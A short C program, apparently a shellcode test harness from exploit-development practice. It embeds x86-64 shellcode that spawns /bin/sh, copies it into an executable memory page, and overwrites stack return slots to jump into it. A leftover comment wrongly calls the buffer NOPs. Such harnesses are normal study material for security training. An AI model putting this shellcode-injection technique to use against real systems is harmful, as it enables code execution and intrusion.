#include <unistd.h>
#include <signal.h>
#include <stdlib.h>
#include <malloc.h>
#include <sys/mman.h>
#include <string.h>
#include <errno.h>

long long  *hold;
char shellcode[] ="\x48\x89\xe5\x53\x48\x83\xec\x20\xeb\x2e\x5b\x48\x8b\x0b\x48\x89\x4c\x24\x20\x48\x8d\x5c\x24\x20\x48\x31\xff\x48\x31\xc0\x88\x43\x07\x48\x89\xdf\xb0\x3b\x48\x31\xf6\x48\x89\xf2\x0f\x05\x48\x89\xc3\xb0\x3c\x48\x31\xff\x0f\x05\xe8\xcd\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";



  //Replace the above shellcode buffer of NOP operations with the hex code for you shell code.
  //NOTE: Make sure it is null terminated, but otherwise has no NULL characters embedded.

void decoy(char *cx)

{
 long long *ret;
 
 hold= (long long *)&ret;
 (*hold)=(long long)cx;
  hold++;
  (*hold)=(long long)cx;
  hold++;
  (*hold)=(long long)cx;
  hold++;
  (*hold)=(long long)cx;
 hold++;
  (*hold)=(long long)cx;
 hold++;
  (*hold)=(long long)cx;



}

void main ()
{  
  int pagesize;
  char *buf;
  
  pagesize = sysconf(_SC_PAGE_SIZE);
  posix_memalign(&buf, pagesize, strlen(shellcode)+10);
  strcpy(buf,shellcode);
  mprotect(buf, strlen(shellcode)+10, PROT_EXEC|PROT_WRITE|PROT_READ);
  decoy(buf);  
  return;  
}



	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
